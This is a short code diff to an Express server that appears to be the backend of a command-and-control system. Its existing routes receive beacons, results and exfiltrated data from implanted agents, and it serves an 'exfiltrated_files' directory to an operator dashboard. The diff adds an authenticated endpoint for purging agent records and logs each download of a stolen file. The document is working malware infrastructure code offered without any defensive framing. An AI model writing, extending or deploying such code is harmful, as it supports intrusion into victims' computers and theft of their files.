@@ -30,6 +30,20 @@ app.use('/api/beacon', require('./routes/beacon'));
 app.use('/api/result', require('./routes/results'));
 app.use('/api/exfiltrate', require('./routes/exfiltrate'));
 
+// Immediate Purge Override
+app.post('/api/agents/purge/:id', require('./middleware/auth').verifyToken, (req, res) => {
+  const Agent = require('./models/agent');
+  console.log(`[OVERRIDE] Attempting purge for ID: ${req.params.id}`);
+  try {
+    Agent.remove(req.params.id);
+    console.log(`[OVERRIDE] Agent ${req.params.id} PURGED`);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('[OVERRIDE] Purge Error:', err.message);
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Dashboard routes (JWT protected)
 app.use('/api/auth', require('./routes/auth'));
 app.use('/api/agents', require('./routes/agents'));
@@ -51,7 +65,10 @@ app.get('/api/health', (req, res) => {
 // Locate dashboard/dist relative to this file
 const distPath = path.join(__dirname, '../../dashboard/dist');
 app.use(express.static(distPath));
-app.use('/exfiltrated', express.static(path.join(__dirname, '../../exfiltrated_files')));
+app.use('/exfiltrated', (req, res, next) => {
+  console.log(`[DOWNLOAD] Request for exfiltrated file: ${req.url}`);
+  next();
+}, express.static(path.join(__dirname, '../../exfiltrated_files')));
 
 // Catch-all for SPA routing (must be after /api routes)
 app.get('*', (req, res, next) => {
